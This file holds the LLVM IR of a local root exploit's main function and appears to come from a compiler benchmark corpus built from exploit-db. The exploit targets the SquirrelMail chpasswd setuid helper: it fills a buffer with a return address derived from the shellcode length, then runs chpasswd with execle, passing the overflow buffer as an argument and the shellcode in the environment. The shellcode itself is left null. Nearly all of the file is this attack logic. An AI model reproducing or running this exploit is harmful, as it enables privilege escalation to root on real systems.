; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_273.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_273.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shellcode = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [74 x i8] c"\0A*** Squirremail chpasswd local root exploit by 0x3142@hushmail.com ***\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [31 x i8] c"Usage: %s <path-to-chpasswd>\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"chpasswd\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"0x314\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"m0s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [2 x i8*], align 16
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca i64*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = getelementptr inbounds [2 x i8*], [2 x i8*]* %6, i64 0, i64 0
  %13 = load i8*, i8** @shellcode, align 8
  store i8* %13, i8** %12, align 8
  %14 = getelementptr inbounds i8*, i8** %12, i64 1
  store i8* null, i8** %14, align 8
  %15 = call i8* @malloc(i32 200)
  store i8* %15, i8** %10, align 8
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str, i64 0, i64 0))
  %17 = load i32, i32* %4, align 4
  %18 = icmp ne i32 %17, 2
  br i1 %18, label %19, label %25

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.1, i64 0, i64 0), i8* %22)
  %24 = call i32 @exit(i32 0) #3
  unreachable

25:                                               ; preds = %2
  %26 = load i8*, i8** @shellcode, align 8
  %27 = call i64 @strlen(i8* %26)
  %28 = sub nsw i64 3221225466, %27
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 1
  %31 = load i8*, i8** %30, align 8
  %32 = call i64 @strlen(i8* %31)
  %33 = sub nsw i64 %28, %32
  store i64 %33, i64* %8, align 8
  %34 = load i8*, i8** %10, align 8
  store i8* %34, i8** %11, align 8
  %35 = load i8*, i8** %11, align 8
  %36 = bitcast i8* %35 to i64*
  store i64* %36, i64** %9, align 8
  store i32 0, i32* %7, align 4
  br label %37

37:                                               ; preds = %44, %25
  %38 = load i32, i32* %7, align 4
  %39 = icmp slt i32 %38, 200
  br i1 %39, label %40, label %47

40:                                               ; preds = %37
  %41 = load i64, i64* %8, align 8
  %42 = load i64*, i64** %9, align 8
  %43 = getelementptr inbounds i64, i64* %42, i32 1
  store i64* %43, i64** %9, align 8
  store i64 %41, i64* %42, align 8
  br label %44

44:                                               ; preds = %40
  %45 = load i32, i32* %7, align 4
  %46 = add nsw i32 %45, 4
  store i32 %46, i32* %7, align 4
  br label %37

47:                                               ; preds = %37
  %48 = load i8*, i8** %10, align 8
  %49 = getelementptr inbounds i8, i8* %48, i64 199
  store i8 0, i8* %49, align 1
  %50 = load i8**, i8*** %5, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 1
  %52 = load i8*, i8** %51, align 8
  %53 = load i8*, i8** %10, align 8
  %54 = getelementptr inbounds [2 x i8*], [2 x i8*]* %6, i64 0, i64 0
  %55 = call i32 @execle(i8* %52, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0), i8* %53, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0), i32 0, i8** %54)
  %56 = load i8*, i8** %10, align 8
  %57 = call i32 @free(i8* %56)
  ret i32 0
}

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @execle(i8*, i8*, i8*, i8*, i8*, i32, i8**) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
